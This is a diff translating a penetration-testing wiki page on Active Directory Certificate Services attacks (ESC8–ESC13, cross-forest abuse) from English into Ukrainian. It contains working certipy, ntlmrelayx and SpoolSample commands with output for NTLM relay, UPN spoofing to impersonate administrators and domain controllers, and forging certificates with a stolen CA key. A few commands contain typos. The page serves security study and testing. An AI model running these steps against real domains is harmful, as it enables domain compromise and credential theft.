 [*] Successfully added officer 'John' on 'corp-DC-CA'
 ```
-
-The **`SubCA`** template can be **enabled on the CA** with the `-enable-template` parameter. By default, the `SubCA` template is enabled.
-
+Шаблон **`SubCA`** може бути **увімкнений на CA** з параметром `-enable-template`. За замовчуванням шаблон `SubCA` увімкнений.
 ```bash
 # List templates
 certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
@@ -322,11 +289,9 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully enabled 'SubCA' on 'corp-DC-CA'
 ```
+Якщо ми виконали попередні вимоги для цієї атаки, ми можемо почати з **запиту сертифіката на основі шаблону `SubCA`**.
 
-If we have fulfilled the prerequisites for this attack, we can start by **requesting a certificate based on the `SubCA` template**.
-
-**This request will be denie**d, but we will save the private key and note down the request ID.
-
+**Цей запит буде відхилено**, але ми збережемо приватний ключ і запишемо ідентифікатор запиту.
 ```bash
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -338,18 +303,14 @@ Would you like to save the private key? (y/N) y
 [*] Saved private key to 785.key
 [-] Failed to request certificate
 ```
-
-With our **`Manage CA` and `Manage Certificates`**, we can then **issue the failed certificate** request with the `ca` command and the `-issue-request <request ID>` parameter.
-
+З нашими **`Manage CA` та `Manage Certificates`** ми можемо **випустити невдалий запит на сертифікат** за допомогою команди `ca` та параметра `-issue-request <request ID>`.
 ```bash
 certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully issued certificate
 ```
-
-And finally, we can **retrieve the issued certificate** with the `req` command and the `-retrieve <request ID>` parameter.
-
+І нарешті, ми можемо **отримати виданий сертифікат** за допомогою команди `req` та параметра `-retrieve <request ID>`.
 ```bash
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -361,60 +322,52 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 [*] Loaded private key from '785.key'
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
+## NTLM Relay до AD CS HTTP кінцевих точок – ESC8
 
-## NTLM Relay to AD CS HTTP Endpoints – ESC8
-
-### Explanation
+### Пояснення
 
 > [!NOTE]
-> In environments where **AD CS is installed**, if a **web enrollment endpoint vulnerable** exists and at least one **certificate template is published** that permits **domain computer enrollment and client authentication** (such as the default **`Machine`** template), it becomes possible for **any computer with the spooler service active to be compromised by an attacker**!
+> У середовищах, де **встановлено AD CS**, якщо існує **вразливий веб-інтерфейс для реєстрації** і принаймні один **шаблон сертифіката опубліковано**, що дозволяє **реєстрацію комп'ютерів домену та автентифікацію клієнтів** (такий як стандартний **`Machine`** шаблон), стає можливим, щоб **будь-який комп'ютер з активною службою спулера був скомпрометований зловмисником**!
 
-Several **HTTP-based enrollment methods** are supported by AD CS, made available through additional server roles that administrators may install. These interfaces for HTTP-based certificate enrollment are susceptible to **NTLM relay attacks**. An attacker, from a **compromised machine, can impersonate any AD account that authenticates via inbound NTLM**. While impersonating the victim account, these web interfaces can be accessed by an attacker to **request a client authentication certificate using the `User` or `Machine` certificate templates**.
+Кілька **методів реєстрації на основі HTTP** підтримуються AD CS, які доступні через додаткові серверні ролі, які можуть встановити адміністратори. Ці інтерфейси для реєстрації сертифікатів на основі HTTP вразливі до **атак NTLM relay**. Зловмисник з **скомпрометованої машини може видавати себе за будь-який обліковий запис AD, який автентифікується через вхідний NTLM**. В той час як зловмисник видає себе за обліковий запис жертви, ці веб-інтерфейси можуть бути доступні зловмиснику для **запиту сертифіката автентифікації клієнта, використовуючи шаблони сертифікатів `User` або `Machine`**.
 
-- The **web enrollment interface** (an older ASP application available at `http://<caserver>/certsrv/`), defaults to HTTP only, which does not offer protection against NTLM relay attacks. Additionally, it explicitly permits only NTLM authentication through its Authorization HTTP header, rendering more secure authentication methods like Kerberos inapplicable.
-- The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) by default support negotiate authentication via their Authorization HTTP header. Negotiate authentication **supports both** Kerberos and **NTLM**, allowing an attacker to **downgrade to NTLM** authentication during relay attacks. Although these web services enable HTTPS by default, HTTPS alone **does not safeguard against NTLM relay attacks**. Protection from NTLM relay attacks for HTTPS services is only possible when HTTPS is combined with channel binding. Regrettably, AD CS does not activate Extended Protection for Authentication on IIS, which is required for channel binding.
+- **Веб-інтерфейс реєстрації** (старий ASP-додаток, доступний за адресою `http://<caserver>/certsrv/`), за замовчуванням використовує лише HTTP, що не забезпечує захисту від атак NTLM relay. Крім того, він явно дозволяє лише NTLM автентифікацію через свій заголовок Authorization HTTP, що робить більш безпечні методи автентифікації, такі як Kerberos, непридатними.
+- **Служба реєстрації сертифікатів** (CES), **Політика реєстрації сертифікатів** (CEP) веб-сервісу та **Служба реєстрації мережевих пристроїв** (NDES) за замовчуванням підтримують автентифікацію negotiate через свій заголовок Authorization HTTP. Автентифікація negotiate **підтримує як** Kerberos, так і **NTLM**, що дозволяє зловмиснику **знизити рівень до NTLM** автентифікації під час атак relay. Хоча ці веб-сервіси за замовчуванням активують HTTPS, HTTPS сам по собі **не захищає від атак NTLM relay**. Захист від атак NTLM relay для HTTPS-сервісів можливий лише тоді, коли HTTPS поєднується з прив'язкою каналу. На жаль, AD CS не активує Розширений захист для автентифікації на IIS, що є необхідним для прив'язки каналу.
 
-A common **issue** with NTLM relay attacks is the **short duration of NTLM sessions** and the inability of the attacker to interact with services that **require NTLM signing**.
+Звичайною **проблемою** атак NTLM relay є **коротка тривалість сесій NTLM** та неможливість зловмисника взаємодіяти з сервісами, які **вимагають підписування NTLM**.
 
-Nevertheless, this limitation is overcome by exploiting an NTLM relay attack to acquire a certificate for the user, as the certificate's validity period dictates the session's duration, and the certificate can be employed with services that **mandate NTLM signing**. For instructions on utilizing a stolen certificate, refer to:
+Проте, це обмеження подолано шляхом використання атаки NTLM relay для отримання сертифіката для користувача, оскільки термін дії сертифіката визначає тривалість сесії, а сертифікат може бути використаний з сервісами, які **вимагають підписування NTLM**. Для інструкцій щодо використання вкраденого сертифіката зверніться до:
 
 {{#ref}}
 account-persistence.md
 {{#endref}}
 
-Another limitation of NTLM relay attacks is that **an attacker-controlled machine must be authenticated to by a victim account**. The attacker could either wait or attempt to **force** this authentication:
+Ще одне обмеження атак NTLM relay полягає в тому, що **машина, контрольована зловмисником, повинна бути автентифікована обліковим записом жертви**. Зловмисник може або чекати, або намагатися **примусити** цю автентифікацію:
 
 {{#ref}}
 ../printers-spooler-service-abuse.md
 {{#endref}}
 
-### **Abuse**
+### **Зловживання**
 
-[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:
-
+[**Certify**](https://github.com/GhostPack/Certify)’s `cas` перераховує **включені HTTP AD CS кінцеві точки**:
 ```
 Certify.exe cas
 ```
-
 <figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>
 
-The `msPKI-Enrollment-Servers` property is used by enterprise Certificate Authorities (CAs) to store Certificate Enrollment Service (CES) endpoints. These endpoints can be parsed and listed by utilizing the tool **Certutil.exe**:
-
+Властивість `msPKI-Enrollment-Servers` використовується корпоративними центрами сертифікації (CAs) для зберігання кінцевих точок служби реєстрації сертифікатів (CES). Ці кінцеві точки можна розібрати та перерахувати, використовуючи інструмент **Certutil.exe**:
 ```
 certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
 ```
-
 <figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
-
 ```powershell
 Import-Module PSPKI
 Get-CertificationAuthority | select Name,Enroll* | Format-List *
 ```
-
 <figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>
 
-#### Abuse with Certify
-
+#### Зловживання з Certify
 ```bash
 ## In the victim machine
 # Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
@@ -429,13 +382,11 @@ proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2sup
 # Force authentication from victim to compromised machine with port forwards
 execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
 ```
+#### Зловживання з [Certipy](https://github.com/ly4k/Certipy)
 
-#### Abuse with [Certipy](https://github.com/ly4k/Certipy)
+Запит на сертифікат за замовчуванням здійснюється Certipy на основі шаблону `Machine` або `User`, залежно від того, чи закінчується ім'я облікового запису, що передається, на `$`. Вказати альтернативний шаблон можна за допомогою параметра `-template`.
 
-The request for a certificate is made by Certipy by default based on the template `Machine` or `User`, determined by whether the account name being relayed ends in `$`. The specification of an alternative template can be achieved through the use of the `-template` parameter.
-
-A technique like [PetitPotam](https://github.com/ly4k/PetitPotam) can then be employed to coerce authentication. When dealing with domain controllers, the specification of `-template DomainController` is required.
-
+Техніку, таку як [PetitPotam](https://github.com/ly4k/PetitPotam), можна використовувати для примусу аутентифікації. При роботі з контролерами домену необхідно вказати `-template DomainController`.
 ```bash
 certipy relay -ca ca.corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -448,182 +399,146 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 [*] Exiting...
 ```
-
 ## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>
 
-### Explanation
+### Пояснення
 
-The new value **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) for **`msPKI-Enrollment-Flag`**, referred to as ESC9, prevents the embedding of the **new `szOID_NTDS_CA_SECURITY_EXT` security extension** in a certificate. This flag becomes relevant when `StrongCertificateBindingEnforcement` is set to `1` (the default setting), which contrasts with a setting of `2`. Its relevance is heightened in scenarios where a weaker certificate mapping for Kerberos or Schannel might be exploited (as in ESC10), given that the absence of ESC9 would not alter the requirements.
+Новий значення **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) для **`msPKI-Enrollment-Flag`**, відомий як ESC9, запобігає вбудовуванню **нового `szOID_NTDS_CA_SECURITY_EXT` безпекового розширення** в сертифікат. Цей прапорець стає актуальним, коли `StrongCertificateBindingEnforcement` встановлено на `1` (значення за замовчуванням), що контрастує з налаштуванням `2`. Його значущість зростає в сценаріях, де може бути використано слабше відображення сертифікатів для Kerberos або Schannel (як у ESC10), оскільки відсутність ESC9 не змінює вимоги.
 
-The conditions under which this flag's setting becomes significant include:
+Умови, за яких налаштування цього прапорця стає значущим, включають:
 
-- `StrongCertificateBindingEnforcement` is not adjusted to `2` (with the default being `1`), or `CertificateMappingMethods` includes the `UPN` flag.
-- The certificate is marked with the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` setting.
-- Any client authentication EKU is specified by the certificate.
-- `GenericWrite` permissions are available over any account to compromise another.
+- `StrongCertificateBindingEnforcement` не налаштовано на `2` (за замовчуванням `1`), або `CertificateMappingMethods` включає прапорець `UPN`.
+- Сертифікат позначений прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у налаштуванні `msPKI-Enrollment-Flag`.
+- Будь-який EKU аутентифікації клієнта вказується сертифікатом.
+- Доступні дозволи `GenericWrite` над будь-яким обліковим записом для компрометації іншого.
 
-### Abuse Scenario
+### Сценарій зловживання
 
-Suppose `John@corp.local` holds `GenericWrite` permissions over `Jane@corp.local`, with the goal to compromise `Administrator@corp.local`. The `ESC9` certificate template, which `Jane@corp.local` is permitted to enroll in, is configured with the `CT_FLAG_NO_SECURITY_EXTENSION` flag in its `msPKI-Enrollment-Flag` setting.
+Припустимо, що `John@corp.local` має дозволи `GenericWrite` над `Jane@corp.local`, з метою компрометації `Administrator@corp.local`. Шаблон сертифіката `ESC9`, в який `Jane@corp.local` дозволено реєструватися, налаштований з прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у своєму налаштуванні `msPKI-Enrollment-Flag`.
 
-Initially, `Jane`'s hash is acquired using Shadow Credentials, thanks to `John`'s `GenericWrite`:
-
+Спочатку хеш `Jane` отримується за допомогою Shadow Credentials, завдяки `GenericWrite` Джона:
 ```bash
 certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
 ```
-
-Subsequently, `Jane`'s `userPrincipalName` is modified to `Administrator`, purposely omitting the `@corp.local` domain part:
-
+В подальшому `Jane`'s `userPrincipalName` змінюється на `Administrator`, навмисно пропускаючи частину домену `@corp.local`:
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
 ```
+Ця модифікація не порушує обмеження, оскільки `Administrator@corp.local` залишається відмінним як `userPrincipalName` `Administrator`.
 
-This modification does not violate constraints, given that `Administrator@corp.local` remains distinct as `Administrator`'s `userPrincipalName`.
-
-Following this, the `ESC9` certificate template, marked vulnerable, is requested as `Jane`:
-
+Після цього запитується шаблон сертифіката `ESC9`, позначений як вразливий, як `Jane`:
 ```bash
 certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
 ```
+Зазначено, що `userPrincipalName` сертифіката відображає `Administrator`, без будь-якого “object SID”.
 
-It's noted that the certificate's `userPrincipalName` reflects `Administrator`, devoid of any “object SID”.
-
-`Jane`'s `userPrincipalName` is then reverted to her original, `Jane@corp.local`:
-
+`userPrincipalName` `Jane` потім повертається до її оригінального, `Jane@corp.local`:
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 ```
-
-Attempting authentication with the issued certificate now yields the NT hash of `Administrator@corp.local`. The command must include `-domain <domain>` due to the certificate's lack of domain specification:
-
+Спроба аутентифікації з виданим сертифікатом тепер дає NT хеш `Administrator@corp.local`. Команда повинна включати `-domain <domain>` через відсутність специфікації домену в сертифікаті:
 ```bash
 certipy auth -pfx adminitrator.pfx -domain corp.local
 ```
+## Слабкі відображення сертифікатів - ESC10
 
-## Weak Certificate Mappings - ESC10
+### Пояснення
 
-### Explanation
+Два значення ключів реєстру на контролері домену відносяться до ESC10:
 
-Two registry key values on the domain controller are referred to by ESC10:
+- Значення за замовчуванням для `CertificateMappingMethods` під `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` дорівнює `0x18` (`0x8 | 0x10`), раніше було встановлено на `0x1F`.
+- Налаштування за замовчуванням для `StrongCertificateBindingEnforcement` під `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` дорівнює `1`, раніше `0`.
 
-- The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
-- The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.
+**Випадок 1**
 
-**Case 1**
+Коли `StrongCertificateBindingEnforcement` налаштовано на `0`.
 
-When `StrongCertificateBindingEnforcement` is configured as `0`.
+**Випадок 2**
 
-**Case 2**
+Якщо `CertificateMappingMethods` включає біт `UPN` (`0x4`).
 
-If `CertificateMappingMethods` includes the `UPN` bit (`0x4`).
+### Випадок зловживання 1
 
-### Abuse Case 1
+При налаштуванні `StrongCertificateBindingEnforcement` на `0`, обліковий запис A з правами `GenericWrite` може бути використаний для компрометації будь-якого облікового запису B.
 
-With `StrongCertificateBindingEnforcement` configured as `0`, an account A with `GenericWrite` permissions can be exploited to compromise any account B.
+Наприклад, маючи права `GenericWrite` на `Jane@corp.local`, зловмисник намагається скомпрометувати `Administrator@corp.local`. Процедура повторює ESC9, дозволяючи використовувати будь-який шаблон сертифіката.
 
-For instance, having `GenericWrite` permissions over `Jane@corp.local`, an attacker aims to compromise `Administrator@corp.local`. The procedure mirrors ESC9, allowing any certificate template to be utilized.
-
-Initially, `Jane`'s hash is retrieved using Shadow Credentials, exploiting the `GenericWrite`.
-
+Спочатку хеш `Jane` отримується за допомогою Shadow Credentials, експлуатуючи `GenericWrite`.
 ```bash
 certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
 ```
-
-Subsequently, `Jane`'s `userPrincipalName` is altered to `Administrator`, deliberately omitting the `@corp.local` portion to avoid a constraint violation.
-
+В результаті, `Jane`'s `userPrincipalName` змінюється на `Administrator`, навмисно пропускаючи частину `@corp.local`, щоб уникнути порушення обмеження.
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
 ```
-
-Following this, a certificate enabling client authentication is requested as `Jane`, using the default `User` template.
-
+Наступним кроком запитується сертифікат, що дозволяє автентифікацію клієнта, як `Jane`, з використанням шаблону за замовчуванням `User`.
 ```bash
 certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
 ```
-
-`Jane`'s `userPrincipalName` is then reverted to its original, `Jane@corp.local`.
-
+`userPrincipalName` `Jane` повертається до свого оригінального, `Jane@corp.local`.
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 ```
-
-Authenticating with the obtained certificate will yield the NT hash of `Administrator@corp.local`, necessitating the specification of the domain in the command due to the absence of domain details in the certificate.
-
+Аутентифікація з отриманим сертифікатом дасть NT хеш `Administrator@corp.local`, що вимагає вказівки домену в команді через відсутність деталей домену в сертифікаті.
 ```bash
 certipy auth -pfx administrator.pfx -domain corp.local
 ```
+### Зловживання випадок 2
 
-### Abuse Case 2
+З `CertificateMappingMethods`, що містить бітовий прапорець `UPN` (`0x4`), обліковий запис A з правами `GenericWrite` може скомпрометувати будь-який обліковий запис B, що не має властивості `userPrincipalName`, включаючи облікові записи машин і вбудованого доменного адміністратора `Administrator`.
 
-With the `CertificateMappingMethods` containing the `UPN` bit flag (`0x4`), an account A with `GenericWrite` permissions can compromise any account B lacking a `userPrincipalName` property, including machine accounts and the built-in domain administrator `Administrator`.
-
-Here, the goal is to compromise `DC$@corp.local`, starting with obtaining `Jane`'s hash through Shadow Credentials, leveraging the `GenericWrite`.
-
+Тут мета полягає в компрометації `DC$@corp.local`, починаючи з отримання хешу `Jane` через Shadow Credentials, використовуючи `GenericWrite`.
 ```bash
 certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
 ```
-
-`Jane`'s `userPrincipalName` is then set to `DC$@corp.local`.
-
+`Jane`'s `userPrincipalName` тепер встановлено на `DC$@corp.local`.
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
 ```
-
-A certificate for client authentication is requested as `Jane` using the default `User` template.
-
+Сертифікат для автентифікації клієнта запитується як `Jane`, використовуючи шаблон за замовчуванням `User`.
 ```bash
 certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
 ```
-
-`Jane`'s `userPrincipalName` is reverted to its original after this process.
-
+`Jane`'s `userPrincipalName` повертається до свого оригіналу після цього процесу.
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
 ```
-
-To authenticate via Schannel, Certipy’s `-ldap-shell` option is utilized, indicating authentication success as `u:CORP\DC$`.
-
+Щоб аутентифікуватися через Schannel, використовується опція Certipy `-ldap-shell`, що вказує на успішну аутентифікацію як `u:CORP\DC$`.
 ```bash
 certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 ```
-
-Through the LDAP shell, commands such as `set_rbcd` enable Resource-Based Constrained Delegation (RBCD) attacks, potentially compromising the domain controller.
-
+Через LDAP shell команди, такі як `set_rbcd`, дозволяють атаки на основі обмеженої делегації ресурсів (RBCD), що потенційно може скомпрометувати контролер домену.
 ```bash
 certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 ```
-
-This vulnerability also extends to any user account lacking a `userPrincipalName` or where it does not match the `sAMAccountName`, with the default `Administrator@corp.local` being a prime target due to its elevated LDAP privileges and the absence of a `userPrincipalName` by default.
+Ця вразливість також поширюється на будь-який обліковий запис користувача, який не має `userPrincipalName` або де він не збігається з `sAMAccountName`, при цьому за замовчуванням `Administrator@corp.local` є основною мішенню через свої підвищені привілеї LDAP та відсутність `userPrincipalName` за замовчуванням.
 
 ## Relaying NTLM to ICPR - ESC11
 
-### Explanation
+### Пояснення
 
-If CA Server Do not configured with `IF_ENFORCEENCRYPTICERTREQUEST`, it can be makes NTLM relay attacks without signing via RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).
+Якщо CA Server не налаштований з `IF_ENFORCEENCRYPTICERTREQUEST`, це може призвести до атак NTLM relay без підпису через RPC-сервіс. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).
 
-You can use `certipy` to enumerate if `Enforce Encryption for Requests` is Disabled and certipy will show `ESC11` Vulnerabilities.
-
+Ви можете використовувати `certipy`, щоб перевірити, чи вимкнено `Enforce Encryption for Requests`, і certipy покаже вразливості `ESC11`.
 ```bash
 $ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 Certificate Authorities
-  0
-    CA Name                             : DC01-CA
-    DNS Name                            : DC01.domain.local
-    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
-    ....
-    Enforce Encryption for Requests     : Disabled
-    ....
-    [!] Vulnerabilities
-      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
+0
+CA Name                             : DC01-CA
+DNS Name                            : DC01.domain.local
+Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
+....
+Enforce Encryption for Requests     : Disabled
+....
+[!] Vulnerabilities
+ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
 
 ```
+### Сценарій зловживання
 
-### Abuse Scenario
-
-It need to setup a relay server:
-
+Потрібно налаштувати релейний сервер:
 ```bash
 $ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
 Certipy v4.7.0 - by Oliver Lyak (ly4k)
@@ -642,33 +557,29 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 [*] Exiting...
 ```
+Примітка: Для контролерів домену ми повинні вказати `-template` в DomainController.
 
-Note: For domain controllers, we must specify `-template` in DomainController.
-
-Or using [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
-
+Або використовуючи [форк sploutchy імпакту](https://github.com/sploutchy/impacket):
 ```bash
 $ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
 ```
+## Shell доступ до ADCS CA з YubiHSM - ESC12
 
-## Shell access to ADCS CA with YubiHSM - ESC12
+### Пояснення
 
-### Explanation
+Адміністратори можуть налаштувати Центр сертифікації для зберігання його на зовнішньому пристрої, наприклад, "Yubico YubiHSM2".
 
-Administrators can set up the Certificate Authority to store it on an external device like the "Yubico YubiHSM2".
+Якщо USB-пристрій підключено до сервера CA через USB-порт або до сервера USB у випадку, якщо сервер CA є віртуальною машиною, потрібен ключ аутентифікації (іноді його називають "паролем") для того, щоб Провайдер зберігання ключів міг генерувати та використовувати ключі в YubiHSM.
 
-If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.
+Цей ключ/пароль зберігається в реєстрі за адресою `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` у відкритому вигляді.
 
-This key/password is stored in the registry under `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext.
+Посилання [тут](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).
 
-Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).
+### Сценарій зловживання
 
-### Abuse Scenario
+Якщо приватний ключ CA зберігається на фізичному USB-пристрої, коли ви отримали доступ до оболонки, можливо відновити ключ.
 
-If the CA's private key stored on a physical USB device when you got a shell access, it is possible to recover the key.
-
-In first, you need to obtain the CA certificate (this is public) and then:
-
+Спочатку вам потрібно отримати сертифікат CA (це публічно), а потім:
 ```cmd
 # import it to the user store with CA certificate
 $ certutil -addstore -user my <CA certificate file>
@@ -676,19 +587,17 @@ $ certutil -addstore -user my <CA certificate file>
 # Associated with the private key in the YubiHSM2 device
 $ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
 ```
+Нарешті, використовуйте команду certutil `-sign`, щоб підробити новий довільний сертифікат, використовуючи сертифікат CA та його приватний ключ.
 
-Finally, use the certutil `-sign` command to forge a new arbitrary certificate using the CA certificate and its private key.
+## Зловживання посиланням групи OID - ESC13
 
-## OID Group Link Abuse - ESC13
+### Пояснення
 
-### Explanation
+Атрибут `msPKI-Certificate-Policy` дозволяє додати політику видачі до шаблону сертифіката. Об'єкти `msPKI-Enterprise-Oid`, які відповідають за видачу політик, можна виявити в Контексті Іменування Конфігурації (CN=OID,CN=Public Key Services,CN=Services) контейнера PKI OID. Політика може бути пов'язана з групою AD, використовуючи атрибут `msDS-OIDToGroupLink` цього об'єкта, що дозволяє системі авторизувати користувача, який представляє сертифікат, так ніби він є членом групи. [Посилання тут](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).
 
-The `msPKI-Certificate-Policy` attribute allows the issuance policy to be added to the certificate template. The `msPKI-Enterprise-Oid` objects that are responsible for issuing policies can be discovered in the Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) of the PKI OID container. A policy can be linked to an AD group using this object's `msDS-OIDToGroupLink` attribute, enabling a system to authorize a user who presents the certificate as though he were a member of the group. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).
+Іншими словами, коли користувач має дозвіл на реєстрацію сертифіката, а сертифікат пов'язаний з групою OID, користувач може успадкувати привілеї цієї групи.
 
-In other words, when a user has permission to enroll a certificate and the certificate is link to an OID group, the user can inherit the privileges of this group.
-
-Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:
-
+Використовуйте [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), щоб знайти OIDToGroupLink:
 ```powershell
 Enumerating OIDs
 ------------------------
@@ -710,35 +619,31 @@ OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.139243
 OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
 ------------------------
 ```
+### Сценарій зловживання
 
-### Abuse Scenario
+Знайдіть дозволи користувача, які можна використовувати за допомогою `certipy find` або `Certify.exe find /showAllPermissions`.
 
-Find a user permission it can use `certipy find` or `Certify.exe find /showAllPermissions`.
+Якщо `John` має дозвіл на реєстрацію `VulnerableTemplate`, користувач може успадкувати привілеї групи `VulnerableGroup`.
 
-If `John` have have permission to enroll `VulnerableTemplate`, the user can inherit the privileges of `VulnerableGroup` group.
-
-All it need to do just specify the template, it will get a certificate with OIDToGroupLink rights.
-
+Все, що потрібно зробити, це вказати шаблон, і він отримає сертифікат з правами OIDToGroupLink.
 ```bash
 certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
 ```
+## Компрометація Лісів за Допомогою Сертифікатів Пояснена в Пасивному Голосі
 
-## Compromising Forests with Certificates Explained in Passive Voice
+### Порушення Лісових Довіреностей через Компрометовані ЦА
 
-### Breaking of Forest Trusts by Compromised CAs
+Конфігурація для **крос-лісової реєстрації** є відносно простою. **Кореневий сертифікат ЦА** з ресурсного лісу **публікується в облікових лісах** адміністраторами, а **сертифікати підприємницької ЦА** з ресурсного лісу **додаються до контейнерів `NTAuthCertificates` та AIA в кожному обліковому лісі**. Для уточнення, ця угода надає **ЦА в ресурсному лісі повний контроль** над усіма іншими лісами, для яких вона управляє PKI. Якщо ця ЦА буде **компрометована зловмисниками**, сертифікати для всіх користувачів як в ресурсному, так і в облікових лісах можуть бути **підроблені ними**, тим самим порушуючи межу безпеки лісу.
 
-The configuration for **cross-forest enrollment** is made relatively straightforward. The **root CA certificate** from the resource forest is **published to the account forests** by administrators, and the **enterprise CA** certificates from the resource forest are **added to the `NTAuthCertificates` and AIA containers in each account forest**. To clarify, this arrangement grants the **CA in the resource forest complete control** over all other forests for which it manages PKI. Should this CA be **compromised by attackers**, certificates for all users in both the resource and account forests could be **forged by them**, thereby breaking the security boundary of the forest.
+### Привілеї Реєстрації, Надані Іноземним Принципалам
 
-### Enrollment Privileges Granted to Foreign Principals
+У багатолісових середовищах необхідна обережність щодо підприємницьких ЦА, які **публікують шаблони сертифікатів**, що дозволяють **Аутентифікованим Користувачам або іноземним принципалам** (користувачам/групам, які не належать до лісу, до якого належить підприємницька ЦА) **права на реєстрацію та редагування**.\
+Після аутентифікації через довіру, **SID Аутентифікованих Користувачів** додається до токена користувача AD. Таким чином, якщо домен має підприємницьку ЦА з шаблоном, який **дозволяє права на реєстрацію Аутентифікованим Користувачам**, шаблон може потенційно бути **зареєстрований користувачем з іншого лісу**. Аналогічно, якщо **права на реєстрацію явно надані іноземному принципалу шаблоном**, **створюється крос-лісова відносина контролю доступу**, що дозволяє принципалу з одного лісу **реєструватися в шаблоні з іншого лісу**.
 
-In multi-forest environments, caution is required concerning Enterprise CAs that **publish certificate templates** which allow **Authenticated Users or foreign principals** (users/groups external to the forest to which the Enterprise CA belongs) **enrollment and edit rights**.\
